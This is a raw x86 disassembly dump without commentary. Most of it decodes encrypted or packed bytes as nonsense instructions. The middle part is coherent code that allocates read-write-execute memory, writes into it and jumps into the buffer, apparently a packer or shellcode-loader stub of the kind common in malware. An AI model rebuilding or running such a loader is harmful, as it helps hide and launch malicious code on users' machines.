  402043:	enter  0x906e,0xc0
  402047:	cli    
  402048:	mov    eax,ds:0x617291d8
  40204d:	aad    0xdf
  40204f:	add    ebx,edx
  402051:	push   ebp
  402052:	(bad)  
  402053:	mov    bl,0xeb
  402055:	int3   
  402056:	(bad)  
  402057:	xchg   edx,eax
  402058:	sub    DWORD PTR [eax],ebx
  40205a:	sub    BYTE PTR [esi],al
  40205c:	inc    BYTE PTR [eax+0x5e64b961]
  402062:	xchg   edx,eax
  402063:	xchg   DWORD PTR [edx],esp
  402065:	pop    ds
  402066:	push   eax
  402067:	mov    esp,0xb12d5bbd
  40206c:	dec    ecx
  40206d:	dec    edx
  40206e:	push   esi
  40206f:	jmp    0x3bf8:0x6505654a
  402076:	sub    al,0x53
  402078:	loope  0x4020d5
  40207a:	xchg   ebx,eax
  40207b:	imul   ebx,DWORD PTR [esi+eiz*8+0x4774698c],0xffffffa9
  402083:	popf   
  402084:	sub    eax,0x58839761
  402089:	aaa    
  40208a:	pop    ss
  40208b:	xlat   BYTE PTR ds:[ebx]
  40208c:	test   al,0x1a
  40208e:	scas   eax,DWORD PTR es:[edi]
  40208f:	inc    edx
  402091:	std    
  402092:	in     al,dx
  402093:	sub    al,0x12
  402095:	sbb    BYTE PTR [eax],dl
  402097:	shr    ch,0xac
  40209a:	sar    BYTE PTR [ebp+0x46],1
  40209d:	cmp    al,dl
  40209f:	out    dx,al
  4020a0:	mov    ah,0x9e
  4020a2:	mov    bl,BYTE PTR [ebx+edx*1]
  4020a5:	test   DWORD PTR [edx+0x1e],eax
  4020a8:	ins    BYTE PTR es:[edi],dx
  4020a9:	pop    es
  4020aa:	xchg   ebx,edx
  4020ac:	jl     0x402062
  4020ae:	xchg   edi,eax
  4020af:	leave  
  4020b0:	jne    0x4020e7
  4020b2:	and    al,0xb2
  4020b4:	adc    eax,0x23a1fec
  4020b9:	repnz shr cl,0x28
  4020bd:	mov    edx,0xf1f1268
  4020c2:	dec    edx
  4020c3:	ja     0x40209c
  4020c5:	stos   BYTE PTR es:[edi],al
  4020c6:	sti    
  4020c7:	inc    ebx
  4020c8:	dec    edi
  4020c9:	xor    DWORD PTR [esi],eax
  4020cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020cc:	aaa    
  4020cd:	loopne 0x4020ed
  4020cf:	mov    eax,ds:0x93d366c0
  4020d4:	and    cl,0xec
  4020d7:	pop    edx
  4020d8:	xor    al,bh
  4020da:	retf   0xbedc
  4020dd:	xchg   ebp,eax
  4020de:	push   ebp
  4020df:	stc    
  4020e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020e1:	push   ebx
  4020e2:	popf   
  4020e3:	lock gs sub eax,0x5d8a697e
  4020ea:	inc    eax
  4020eb:	jmp    FWORD PTR [eax+0x4103bf8d]
  4020f1:	aas    
  4020f2:	je     0x40209b
  4020f4:	sub    eax,0xad345f12
  4020f9:	shr    DWORD PTR [ebx+0x452496af],cl
  4020ff:	mov    dl,0x2c
  402101:	into   
  402102:	aad    0x1b
  402104:	(bad)  
  402105:	push   edx
  402106:	dec    eax
  402107:	popa   
  402108:	cs out dx,eax
  40210a:	xor    bh,bh
  40210c:	adc    ebx,ebp
  40210e:	scas   eax,DWORD PTR es:[edi]
  40210f:	push   ebp
  402110:	out    0x5e,al
  402112:	in     eax,dx
  402113:	and    DWORD PTR [eax-0xe2adbfa],0x6de95372
  40211d:	repnz int3 
  40211f:	inc    ebp
  402120:	push   edi
  402121:	lea    ebp,[edx+ebx*4]
  402124:	add    DWORD PTR [eax-0x183bd57b],eax
  40212a:	sar    BYTE PTR [esi-0x2e],0x72
  40212e:	xchg   esp,eax
  40212f:	jae    0x4020e4
  402131:	dec    edx
  402132:	aad    0x3d
  402134:	mov    esp,0x20d7b380
  402139:	repz adc DWORD PTR [ebx+0x705cb392],esp
  402140:	imul   edx,DWORD PTR [esp+edi*4+0x3eaf726c],0xffffffd2
  402148:	cs cwde 
  40214a:	fild   WORD PTR [edi+ebx*1-0x5d80226f]
  402151:	inc    esp
  402152:	in     eax,0x7c
  402154:	inc    BYTE PTR [eax-0x72a7eb98]
  40215a:	aam    0xae
  40215c:	js     0x40216e
  40215e:	int3   
  40215f:	pop    esi
  402160:	retf   
  402161:	int    0x1
  402163:	xor    al,0xa0
  402165:	fild   DWORD PTR ds:0x8ce3a750
  40216b:	inc    edx
  40216c:	test   BYTE PTR [eax+0x99130cb],bl
  402172:	cs pop esi
  402174:	dec    esp
  402175:	outs   dx,DWORD PTR ds:[esi]
  402176:	adc    BYTE PTR [ecx+0x69],dh
  402179:	or     DWORD PTR [ecx+ebp*4-0x244540e5],esp
  402180:	sbb    esp,DWORD PTR fs:[edi]
  402183:	adc    eax,0xc1aba915
  402188:	(bad)  
  402189:	scas   eax,DWORD PTR es:[edi]
  40218a:	and    eax,DWORD PTR [ebx]
  40218c:	push   ss
  40218d:	dec    edx
  40218e:	jbe    0x402193
  402190:	push   eax
  402191:	xor    eax,0x8f5e865d
  402196:	mov    edi,0x1f1c6e2f
  40219b:	stos   DWORD PTR es:[edi],eax
  40219c:	in     eax,dx
  40219d:	scas   al,BYTE PTR es:[edi]
  40219e:	mov    ds:0x66bbbcea,al
  4021a3:	pushf  
  4021a4:	ds pushf 
  4021a6:	pusha  
  4021a7:	lods   al,BYTE PTR ds:[esi]
  4021a8:	test   DWORD PTR [esi+edx*8],0x453a7c1f
  4021af:	jo     0x402182
  4021b1:	test   BYTE PTR [edx],bl
  4021b3:	mov    DWORD PTR [esi-0x628d08c8],esp
  4021b9:	mov    edi,0x2356b6aa
  4021be:	call   FWORD PTR [ebp+0xeb01401]
  4021c4:	sbb    al,0x23
  4021c6:	js     0x40216c
  4021c8:	sub    ch,BYTE PTR [edi-0x7d]
  4021cb:	pushf  
  4021cc:	jge    0x402156
  4021ce:	fist   DWORD PTR [ecx]
  4021d0:	(bad)  
  4021d1:	mul    DWORD PTR [ebp+0x6599b980]
  4021d7:	push   ss
  4021d8:	cmp    BYTE PTR [ebx+0x629b87d2],bh
  4021de:	mov    dl,BYTE PTR [edx-0x722cf0f2]
  4021e4:	xor    BYTE PTR [ebx-0x5f57b0c0],ch
  4021ea:	jp     0x402251
  4021ec:	inc    ebx
  4021ed:	das    
  4021ee:	xchg   DWORD PTR [edi+0x25],ebp
  4021f1:	loope  0x40219b
  4021f3:	jg     0x402205
  4021f5:	adc    al,BYTE PTR [ecx-0x6282a216]
  4021fb:	jne    0x40222b
  4021fd:	pop    ebp
  4021fe:	and    DWORD PTR [edi+0x4384efb6],0xffffffca
  402205:	cmp    DWORD PTR fs:[edi],esi
  402208:	sub    eax,0x60d6cf21
  40220d:	mov    ds:0xf9796f81,al
  402212:	dec    ebp
  402213:	nop
  402214:	in     al,dx
  402215:	or     eax,0xad65b938
  40221a:	std    
  40221b:	js     0x40220c
  40221d:	mov    dl,0xb4
  40221f:	lods   al,BYTE PTR ds:[esi]
  402220:	mov    al,ds:0xe4d732fb
  402225:	int3   
  402226:	jnp    0x402251
  402228:	and    dh,ch
  40222a:	fisttp QWORD PTR gs:[esp+edx*2-0x3f]
  40222f:	lahf   
  402230:	call   0x61d0:0xe34b3466
  402237:	jno    0x402248
  402239:	mov    al,0xf6
  40223b:	jmp    DWORD PTR [ebx]
  40223d:	mov    esi,0x7e297e0d
  402242:	sbb    eax,eax
  402244:	ret    
  402245:	inc    DWORD PTR [edx-0x31]
  402248:	add    dl,BYTE PTR [esi+0x4a]
  40224b:	xchg   eax,ebx
  40224d:	and    dh,BYTE PTR [esi]
  40224f:	sub    cl,bh
  402251:	cmp    BYTE PTR [ecx-0x3fb4a938],ch
  402257:	lods   eax,DWORD PTR ds:[esi]
  402258:	mov    ?,edi
  40225a:	pop    ss
  40225b:	lods   al,BYTE PTR ds:[esi]
  40225c:	pop    eax
  40225d:	mov    cl,0xfa
  40225f:	repnz cld 
  402261:	adc    dh,al
  402263:	dec    esp
  402264:	adc    BYTE PTR [eax-0x57],dh
  402267:	mov    al,0xe8
  402269:	lds    edi,FWORD PTR [ebp-0x68a0c361]
  40226f:	dec    eax
  402270:	cmp    edx,ecx
  402272:	mov    cs,ecx
  402274:	dec    ebx
  402275:	mul    dl
  402277:	dec    edi
  402278:	into   
  402279:	ins    BYTE PTR es:[di],dx
  40227b:	test   al,0xb
  40227d:	pop    ss
  40227e:	dec    ebp
  40227f:	(bad)  
  402280:	inc    esp
  402281:	pop    ebp
  402282:	sahf   
  402283:	loope  0x40227a
  402285:	pop    edx
  402286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402287:	jmp    0xafcf:0xa4efb193
  40228e:	int3   
  40228f:	inc    ecx
  402290:	pop    edi
  402291:	xlat   BYTE PTR ds:[ebx]
  402292:	sti    
  402293:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402294:	dec    esi
  402295:	loopne 0x40228f
  402297:	(bad)  
  402298:	push   esi
  402299:	dec    edi
  40229a:	push   ecx
  40229b:	cmc    
  40229c:	jecxz  0x4022fc
  40229e:	retf   0x39f6
  4022a1:	jno    0x402293
  4022a3:	inc    eax
  4022a4:	out    0x2,al
  4022a6:	mov    es,WORD PTR [edx+0x5f]
  4022a9:	mov    edi,0xa5066e9e
  4022ae:	iret   
  4022af:	and    eax,0x863a1c2
  4022b4:	sbb    esi,DWORD PTR [edx]
  4022b6:	push   0xac4f8268
  4022bb:	mov    bh,0x6f
  4022bd:	(bad)  
  4022be:	mov    ebp,0xd77ab9c6
  4022c3:	je     0x40228b
  4022c5:	std    
  4022c6:	icebp  
  4022c7:	in     al,dx
  4022c8:	cwde   
  4022c9:	push   esp
  4022ca:	cmovs  edx,esp
  4022cd:	aam    0x7
  4022cf:	cmp    ch,BYTE PTR [esi+eiz*2-0x7aa0b3d9]
  4022d6:	stos   BYTE PTR es:[edi],al
  4022d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022d8:	scas   al,BYTE PTR es:[edi]
  4022d9:	loop   0x402325
  4022db:	add    eax,0xb8cbf063
  4022e0:	lods   eax,DWORD PTR ds:[esi]
  4022e1:	cmp    esp,edi
  4022e3:	mov    ebx,edx
  4022e5:	cmp    BYTE PTR [ebp+0x51],dl
  4022e8:	sub    al,0x6b
  4022ea:	aam    0x2e
  4022ec:	mov    al,0x96
  4022ee:	push   ds
  4022ef:	inc    ecx
  4022f0:	sbb    cl,0xc2
  4022f3:	pop    ss
  4022f4:	retf   0x9f02
  4022f7:	push   ebx
  4022f8:	xchg   esp,eax
  4022f9:	push   ss
  4022fa:	xchg   esi,eax
  4022fb:	cmp    al,0x48
  4022fd:	stos   BYTE PTR es:[edi],al
  4022fe:	dec    DWORD PTR [edi+0x60376065]
  402304:	cdq    
  402305:	scas   al,BYTE PTR es:[edi]
  402306:	mov    dh,0x8a
  402308:	pop    ebx
  402309:	and    DWORD PTR [edx+esi*1+0x44],esp
  40230d:	cmp    al,0x2a
  40230f:	add    BYTE PTR [edi+0x4ff3168c],al
  402315:	jmp    0xb735:0xeba2fd46
  40231c:	pop    edi
  40231d:	jne    0x40234c
  40231f:	mov    esp,0x88598562
  402324:	mov    al,0x5f
  402326:	push   es
  402327:	stc    
  402328:	icebp  
  402329:	and    edx,0x2f
  40232c:	in     al,0x6c
  40232e:	test   BYTE PTR [edi+0x7a],bl
  402331:	and    al,0x4e
  402333:	leave  
  402334:	(bad)  
  402335:	xchg   ecx,eax
  402336:	sub    BYTE PTR [eax],0x3f
  402339:	in     eax,dx
  40233a:	xor    eax,0x2d652e65
  40233f:	scas   eax,DWORD PTR es:[edi]
  402340:	retf   
  402341:	xchg   esi,eax
  402342:	cmp    al,0x6b
  402344:	aaa    
  402345:	stos   DWORD PTR es:[edi],eax
  402346:	jge    0x402373
  402348:	nop
  402349:	ins    DWORD PTR es:[edi],dx
  40234a:	xor    eax,0xc1cd1519
  40234f:	cmp    eax,DWORD PTR [esp+esi*1-0x20]
  402353:	and    ecx,DWORD PTR [ecx-0x3a]
  402356:	xor    eax,0x2867710a
  40235b:	bound  ebx,QWORD PTR [ebx+ecx*4-0x6b]
  40235f:	ror    ebx,cl
  402361:	repnz popf 
  402363:	jg     0x402348
  402365:	push   ecx
  402366:	out    dx,eax
  402367:	outs   dx,BYTE PTR ds:[esi]
  402368:	inc    ebp
  402369:	xchg   BYTE PTR [eax],ch
  40236b:	sub    ah,ch
  40236d:	dec    esp
  40236e:	lods   al,BYTE PTR ds:[esi]
  40236f:	sbb    DWORD PTR [edi],edi
  402371:	js     0x4023de
  402373:	aam    0xb4
  402375:	ss enter 0xf720,0xb4
  40237a:	frstor [eax+0x17f78385]
  402380:	(bad)  
  402381:	leave  
  402382:	mov    ebx,0xa433e4ce
  402387:	inc    esp
  402388:	sbb    al,bl
  40238a:	jbe    0x40239f
  40238c:	sub    eax,0x6ebcc0a9
  402391:	xchg   BYTE PTR [esp+eiz*2],bl
  402394:	and    edx,ebx
  402396:	push   edx
  402397:	adc    al,0x81
  402399:	add    BYTE PTR [ebx+0x33],ah
  40239c:	pop    ds
  40239d:	fnstsw WORD PTR [edi-0x36]
  4023a0:	jg     0x40241f
  4023a2:	repnz addr16 xchg ecx,eax
  4023a5:	cwde   
  4023a6:	clc    
  4023a7:	leave  
  4023a8:	lds    eax,FWORD PTR [esi]
  4023aa:	in     al,dx
  4023ab:	push   0x20
  4023ad:	mov    eax,ds:0x8cb10ca6
  4023b2:	mov    dh,0xed
  4023b4:	pop    ebx
  4023b5:	jnp    0x40239f
  4023b7:	sub    dh,bl
  4023b9:	cmp    al,0x39
  4023bb:	push   0x488e21c
  4023c0:	sbb    DWORD PTR fs:[ebx+ebp*8-0x40f0f996],eax
  4023c8:	xchg   ecx,eax
  4023c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023ca:	cmp    ecx,DWORD PTR [ebx]
  4023cc:	push   esi
  4023cd:	jg     0x4023f3
  4023cf:	jg     0x4023c6
  4023d1:	add    al,0x71
  4023d3:	cmc    
  4023d4:	cmp    al,0xb0
  4023d6:	jp     0x402452
  4023d8:	loop   0x4023e7
  4023da:	cmp    eax,0xb33f52c9
  4023df:	pushf  
  4023e0:	cli    
  4023e1:	push   ds
  4023e2:	bound  esp,QWORD PTR [eax-0x3ed238cc]
  4023e8:	daa    
  4023e9:	mov    ss,WORD PTR [eax]
  4023eb:	cmp    eax,DWORD PTR [ebx-0x3d0764eb]
  4023f1:	adc    esi,DWORD PTR [esi+ebx*1]
  4023f4:	push   es
  4023f5:	outs   dx,BYTE PTR ds:[esi]
  4023f6:	fisubr DWORD PTR [edx+ebp*8-0x3]
  4023fa:	pop    ebx
  4023fb:	stos   BYTE PTR es:[edi],al
  4023fc:	stc    
  4023fd:	and    BYTE PTR [eax],cl
  4023ff:	mov    ebp,fs
  402401:	shl    DWORD PTR [ebx-0x35d43794],0xdb
  402408:	inc    ebx
  402409:	xchg   ecx,eax
  40240a:	outs   dx,BYTE PTR ds:[esi]
  40240b:	sub    ebp,DWORD PTR [ebp-0x50]
  40240e:	or     ebx,ebx
  402410:	dec    esp
  402411:	xchg   ebp,eax
  402412:	dec    ebx
  402413:	test   eax,0x4ccfacde
  402418:	lods   eax,DWORD PTR ds:[esi]
  402419:	xor    BYTE PTR [edi],dh
  40241b:	xchg   esi,eax
  40241c:	test   cl,ch
  40241e:	jle    0x40245f
  402420:	in     eax,dx
  402421:	jno    0x402488
  402423:	inc    esp
  402424:	loop   0x4023e6
  402426:	jnp    0x40248e
  402428:	jb     0x402415
  40242a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40242b:	pop    ds
  40242c:	push   edx
  40242d:	xor    al,0x75
  40242f:	or     eax,0x285df5a
  402434:	imul   BYTE PTR [ecx-0x7cc4fa0]
  40243a:	pop    eax
  40243b:	imul   esi,DWORD PTR [ebx+0x6fe3ac05],0xffffffd7
  402442:	into   
  402443:	test   al,0xfa
  402445:	mov    edx,0x2d8fed54
  40244a:	xchg   esp,eax
  40244b:	imul   ecx,esp,0x28
  40244e:	loop   0x402400
  402450:	daa    
  402451:	mov    ds:0x37e2f6c5,al
  402456:	(bad)  
  402457:	mov    edx,0x86fccc18
  40245c:	mov    edi,0x2f4b5c6f
  402461:	fcomp  st(6)
  402463:	into   
  402464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402465:	sbb    al,0x3a
  402467:	fwait
  402468:	comiss xmm2,xmm3
  40246b:	dec    eax
  40246c:	adc    al,0x18
  40246e:	fnsave [ebx+0x688abd47]
  402474:	pop    ebx
  402475:	dec    eax
  402476:	add    dl,BYTE PTR [ebx]
  402478:	pop    ebx
  402479:	imul   ecx,ebp,0xffffffa0
  40247c:	push   ebp
  40247d:	mov    DWORD PTR [ebp-0x54],0x0
  402484:	jmp    0x40248f
  402486:	mov    eax,DWORD PTR [ebp-0x54]
  402489:	add    eax,0x1
  40248c:	mov    DWORD PTR [ebp-0x54],eax
  40248f:	cmp    DWORD PTR [ebp-0x54],0x64
  402493:	jae    0x402497
  402495:	jmp    0x402486
  402497:	xor    eax,eax
  402499:	mov    esp,ebp
  40249b:	pop    ebp
  40249c:	ret    0x10
  40249f:	push   ebp
  4024a0:	mov    ebp,esp
  4024a2:	sub    esp,0x70
  4024a5:	mov    DWORD PTR [ebp-0x48],0x0
  4024ac:	mov    DWORD PTR [ebp-0x18],0x0
  4024b3:	mov    DWORD PTR [ebp-0x70],0x0
  4024ba:	mov    DWORD PTR [ebp-0x60],0x0
  4024c1:	mov    DWORD PTR [ebp-0x8],0x0
  4024c8:	mov    DWORD PTR [ebp-0x6c],0x0
  4024cf:	mov    DWORD PTR [ebp-0x68],0x0
  4024d6:	mov    DWORD PTR [ebp-0x14],0x0
  4024dd:	mov    DWORD PTR [ebp-0x4c],0x0
  4024e4:	mov    DWORD PTR [ebp-0x10],0x0
  4024eb:	mov    DWORD PTR [ebp-0x58],0x0
  4024f2:	mov    DWORD PTR [ebp-0x4],0x0
  4024f9:	mov    DWORD PTR [ebp-0x5c],0x0
  402500:	mov    DWORD PTR [ebp-0x30],0x0
  402507:	mov    DWORD PTR [ebp-0x54],0x0
  40250e:	mov    DWORD PTR [ebp-0x2c],0x0
  402515:	mov    DWORD PTR [ebp-0x50],0x0
  40251c:	mov    DWORD PTR [ebp-0xc],0x0
  402523:	mov    eax,ds:0x444628
  402528:	mov    DWORD PTR [ebp-0x28],eax
  40252b:	mov    ecx,DWORD PTR ds:0x44462c
  402531:	mov    DWORD PTR [ebp-0x24],ecx
  402534:	mov    edx,DWORD PTR ds:0x444630
  40253a:	mov    DWORD PTR [ebp-0x20],edx
  40253d:	mov    al,ds:0x444634
  402542:	mov    BYTE PTR [ebp-0x1c],al
  402545:	mov    ecx,DWORD PTR ds:0x444638
  40254b:	mov    DWORD PTR [ebp-0x40],ecx
  40254e:	mov    edx,DWORD PTR ds:0x44463c
  402554:	mov    DWORD PTR [ebp-0x3c],edx
  402557:	mov    eax,ds:0x444640
  40255c:	mov    DWORD PTR [ebp-0x38],eax
  40255f:	mov    cx,WORD PTR ds:0x444644
  402566:	mov    WORD PTR [ebp-0x34],cx
  40256a:	mov    dl,BYTE PTR ds:0x444646
  402570:	mov    BYTE PTR [ebp-0x32],dl
  402573:	mov    DWORD PTR [ebp-0x30],0x40
  40257a:	lea    eax,[ebp-0x10]
  40257d:	push   eax
  40257e:	push   0x444648
  402583:	call   DWORD PTR ds:0x416004
  402589:	test   eax,eax
  40258b:	je     0x40264f
  402591:	lea    ecx,[ebp-0x40]
  402594:	push   ecx
  402595:	lea    edx,[ebp-0x10]
  402598:	push   edx
  402599:	call   DWORD PTR ds:0x416008
  40259f:	test   eax,eax
  4025a1:	je     0x40264f
  4025a7:	push   0x1
  4025a9:	lea    eax,[ebp-0x10]
  4025ac:	push   eax
  4025ad:	call   DWORD PTR ds:0x41600c
  4025b3:	lea    ecx,[ebp-0x10]
  4025b6:	push   ecx
  4025b7:	push   0x0
  4025b9:	push   0x0
  4025bb:	push   0x1
  4025bd:	call   DWORD PTR ds:0x416010
  4025c3:	push   0x0
  4025c5:	push   0x0
  4025c7:	push   0x0
  4025c9:	call   DWORD PTR ds:0x41602c
  4025cf:	mov    DWORD PTR [ebp-0x14],eax
  4025d2:	mov    edx,DWORD PTR [ebp-0x10]
  4025d5:	add    edx,0x1
  4025d8:	mov    DWORD PTR [ebp-0x10],edx
  4025db:	lea    eax,[ebp-0x30]
  4025de:	push   eax
  4025df:	lea    ecx,[ebp-0x50]
  4025e2:	push   ecx
  4025e3:	push   0x40
  4025e5:	push   0x7
  4025e7:	push   0x0
  4025e9:	mov    edx,DWORD PTR [ebp-0x50]
  4025ec:	push   edx
  4025ed:	call   DWORD PTR ds:0x416014
  4025f3:	lea    eax,[ebp-0x50]
  4025f6:	push   eax
  4025f7:	push   0x0
  4025f9:	push   0x8003
  4025fe:	mov    ecx,DWORD PTR [ebp-0x50]
  402601:	push   ecx
  402602:	call   DWORD PTR ds:0x416000
  402608:	lea    edx,[ebp-0x50]
  40260b:	push   edx
  40260c:	push   0x0
  40260e:	push   0x0
  402610:	push   0x8003
  402615:	mov    eax,DWORD PTR [ebp-0x50]
  402618:	push   eax
  402619:	call   DWORD PTR ds:0x416018
  40261f:	push   0x14
  402621:	push   0x0
  402623:	mov    ecx,DWORD PTR [ebp-0x14]
  402626:	push   ecx
  402627:	call   DWORD PTR ds:0x416030
  40262d:	lea    edx,[ebp-0x50]
  402630:	push   edx
  402631:	push   0x0
  402633:	push   0x0
  402635:	push   0x0
  402637:	mov    eax,DWORD PTR [ebp-0x50]
  40263a:	push   eax
  40263b:	call   DWORD PTR ds:0x41601c
  402641:	push   0x0
  402643:	push   0x0
  402645:	mov    ecx,DWORD PTR [ebp-0x14]
  402648:	push   ecx
  402649:	call   DWORD PTR ds:0x416044
  40264f:	call   DWORD PTR ds:0x416038
  402655:	mov    DWORD PTR [ebp-0x2c],eax
  402658:	movzx  edx,WORD PTR [ebp-0x2c]
  40265c:	cmp    edx,0x539
  402662:	jne    0x402693
  402664:	mov    DWORD PTR [ebp-0x14],0xe0d
  40266b:	lea    eax,[ebp-0x28]
  40266e:	push   eax
  40266f:	call   DWORD PTR ds:0x41603c
  402675:	mov    DWORD PTR [ebp-0x60],eax
  402678:	mov    DWORD PTR [ebp-0x54],0x3a
  40267f:	mov    BYTE PTR [ebp-0x34],0x0
  402683:	mov    DWORD PTR [ebp-0x8],0x2dc9e87e
  40268a:	mov    DWORD PTR [ebp-0x68],0xf0e7f
  402691:	jmp    0x4026af
  402693:	mov    BYTE PTR ds:0x430ed0,0x0
  40269a:	mov    BYTE PTR ds:0x41af40,0x0
  4026a1:	push   0x416058
  4026a6:	call   DWORD PTR ds:0x41603c
  4026ac:	mov    DWORD PTR [ebp-0x2c],eax
  4026af:	push   0x0
  4026b1:	call   DWORD PTR ds:0x41603c
  4026b7:	mov    DWORD PTR [ebp-0x2c],eax
  4026ba:	push   DWORD PTR ds:0x41603c
  4026c0:	pop    edx
  4026c1:	mov    DWORD PTR [ebp-0x6c],edx
  4026c4:	lea    ecx,[ebp-0x40]
  4026c7:	push   ecx
  4026c8:	mov    edx,DWORD PTR [ebp-0x60]
  4026cb:	push   edx
  4026cc:	call   DWORD PTR ds:0x416040
  4026d2:	mov    DWORD PTR [ebp-0x44],eax
  4026d5:	push   DWORD PTR [ebp-0x30]
  4026d8:	push   0x1000
  4026dd:	mov    eax,DWORD PTR [ebp-0x14]
  4026e0:	add    eax,0x23
  4026e3:	add    eax,0x23
  4026e6:	push   eax
  4026e7:	xor    eax,eax
  4026e9:	push   eax
  4026ea:	mov    ecx,DWORD PTR [ebp-0x44]
  4026ed:	call   ecx
  4026ef:	push   eax
  4026f0:	pop    ecx
  4026f1:	mov    DWORD PTR [ebp-0x4],ecx
  4026f4:	mov    eax,DWORD PTR [ebp-0x68]
  4026f7:	sub    eax,0xdae0b
  4026fc:	mov    DWORD PTR [ebp-0x68],eax
  4026ff:	cmp    DWORD PTR [ebp-0x4],0x0
  402703:	jne    0x40271d
  402705:	push   0x0
  402707:	push   0x0
  402709:	call   0x4158f4
  40270e:	push   0x0
  402710:	call   DWORD PTR ds:0x416050
  402716:	mov    BYTE PTR ds:0x416058,0x0
  40271d:	mov    ecx,DWORD PTR [ebp-0x4]
  402720:	add    ecx,DWORD PTR [ebp-0x14]
  402723:	mov    edx,DWORD PTR [ebp-0x8]
  402726:	mov    DWORD PTR [ecx],edx
  402728:	mov    eax,DWORD PTR [ebp-0x4]
  40272b:	add    eax,DWORD PTR [ebp-0x54]
  40272e:	mov    DWORD PTR [ebp-0x5c],eax
  402731:	mov    ecx,DWORD PTR ds:0x416040
  402737:	mov    DWORD PTR [ebp-0x4c],ecx
  40273a:	mov    edx,DWORD PTR [ebp-0x4]
  40273d:	add    edx,DWORD PTR [ebp-0x14]
  402740:	mov    eax,DWORD PTR [ebp+0x8]
  402743:	mov    DWORD PTR [edx+0x4],eax
  402746:	mov    ecx,DWORD PTR [ebp-0x4]
  402749:	add    ecx,DWORD PTR [ebp-0x14]
  40274c:	mov    DWORD PTR [ebp-0xc],ecx
  40274f:	cmp    DWORD PTR [ebp-0x68],0x0
  402753:	jbe    0x402770
  402755:	mov    edx,DWORD PTR [ebp-0xc]
  402758:	push   edx
  402759:	mov    eax,DWORD PTR [ebp-0x14]
  40275c:	push   eax
  40275d:	mov    ecx,DWORD PTR [ebp-0x2c]
  402760:	add    ecx,DWORD PTR [ebp-0x68]
  402763:	push   ecx
  402764:	mov    edx,DWORD PTR [ebp-0x4]
  402767:	push   edx
  402768:	call   0x415806
  40276d:	add    esp,0x10
  402770:	cmp    DWORD PTR [ebp-0x5c],0x0
  402774:	je     0x402787
  402776:	push   DWORD PTR [ebp-0x4c]
  402779:	push   DWORD PTR [ebp-0x6c]
  40277c:	mov    edx,DWORD PTR [ebp-0x5c]
  40277f:	push   eax
  402780:	jmp    edx
  402782:	jmp    0x41575c
  402787:	mov    eax,DWORD PTR [ebp+0x8]
  40278a:	mov    DWORD PTR [ebp-0x18],eax
  40278d:	shl    ch,cl
  40278f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402790:	loop   0x402717
  402792:	lods   eax,DWORD PTR ds:[esi]
  402793:	in     eax,0x18
  402795:	fisubr WORD PTR [eax-0x18]
  402798:	jnp    0x402760
  40279a:	pop    es
  40279b:	mov    dh,0x88
  40279d:	in     al,dx
  40279e:	arpl   WORD PTR [esi],di
  4027a0:	cmp    ch,BYTE PTR [ebp+0x6e]
  4027a3:	aaa    
  4027a4:	xor    bl,BYTE PTR [edi+0x53]
  4027a7:	mov    ds:0x3fa2a15b,eax
  4027ac:	dec    esi
  4027ad:	fs std 
  4027af:	scas   al,BYTE PTR es:[edi]
  4027b0:	in     al,0x6
  4027b2:	pop    ebp
  4027b3:	jo     0x4027a8
  4027b5:	out    0xbf,eax
  4027b7:	or     edi,DWORD PTR [eax]
  4027b9:	xlat   BYTE PTR ds:[ebx]
  4027ba:	lds    esp,FWORD PTR [ebp-0x25]
  4027bd:	inc    ecx
  4027be:	jg     0x40281d
  4027c0:	frstor [ecx]
  4027c2:	xchg   edi,eax
  4027c3:	neg    dh
  4027c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027c6:	or     BYTE PTR gs:[ebx+0x21],al
  4027ca:	fcom   QWORD PTR [ebp+0x1a164674]
  4027d0:	fadd   DWORD PTR ds:0xfc77a8a3
  4027d6:	mov    ebx,0xdb13333e
  4027db:	dec    eax
  4027dc:	mov    cs,WORD PTR [edi+0x6efbff9e]
  4027e2:	and    BYTE PTR [esi-0x61c7a168],ch
  4027e8:	sub    DWORD PTR [esi-0x62],ebp
  4027eb:	sar    DWORD PTR [ebx],cl
  4027ed:	in     al,dx
  4027ee:	inc    esi
  4027ef:	daa    
  4027f0:	cdq    
  4027f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027f2:	cmp    BYTE PTR [ebp-0x6b],ch
  4027f5:	aad    0xc4
  4027f7:	das    
  4027f8:	or     al,BYTE PTR [esi+0x712ada6f]
  4027fe:	mov    ah,0xee
  402800:	pop    esi
  402801:	xchg   cl,bl
  402803:	js     0x4027a0
  402805:	test   al,0xf7
  402807:	in     al,dx
  402808:	or     eax,0x27c35ab9
  40280d:	add    DWORD PTR [esi+0x6b],esp
  402810:	cmp    edi,DWORD PTR [ecx]
  402812:	push   ebp
  402813:	mov    BYTE PTR [edi+0x7d],bl
  402816:	jl     0x4027cb
  402818:	test   eax,0xa722ded3
  40281d:	pop    esi
  40281e:	out    0x34,eax
  402820:	inc    edi
  402821:	xchg   ecx,eax
  402822:	aam    0xe9
  402824:	dec    ecx
  402825:	mov    ebx,0x41c6ee67
  40282a:	ins    BYTE PTR es:[edi],dx
  40282b:	imul   DWORD PTR [ecx+esi*4]
  40282e:	fcmovu st,st(1)
  402830:	ja     0x40287c
  402832:	repnz aaa 
  402834:	dec    eax
  402835:	inc    ecx
  402836:	repz aad 0x64
  402839:	push   0x3b
  40283b:	inc    ecx
  40283c:	inc    edi
  40283d:	mov    cl,0x15
  40283f:	push   eax
  402840:	add    BYTE PTR [ebx-0x63113f00],dl
  402846:	push   ss
  402847:	push   eax
  402848:	mov    BYTE PTR [edx-0x7f63d7f4],cl
  40284e:	pushf  
  40284f:	es iret 
  402851:	sub    BYTE PTR [ecx+ecx*4+0x6d],bh
  402855:	xchg   eax,ecx
  402857:	lods   eax,DWORD PTR ds:[esi]
  402858:	dec    esp
  402859:	sbb    ch,al
  40285b:	push   0x40
  40285d:	shl    BYTE PTR [edi+0x5c41ae43],0x50
  402864:	leave  
  402865:	aad    0xa5
  402867:	pop    ebx
